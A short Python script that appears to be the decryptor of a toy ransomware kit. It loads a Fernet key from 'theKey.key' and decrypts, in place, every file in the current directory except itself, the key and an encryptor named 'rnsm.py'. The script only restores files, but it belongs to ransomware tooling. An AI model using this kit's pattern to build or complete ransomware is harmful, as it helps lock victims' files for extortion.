#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
        if file == "rnsm.py" or file == "theKey.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)


with open("theKey.key","rb") as key:
        secretKey = key.read()

for file in files:
        with open(file, "rb") as theFile:
                contents = theFile.read()
        decrypted_contents = Fernet(secretKey).decrypt(contents)
        with open(file, "wb") as theFile:
                theFile.write(decrypted_contents)
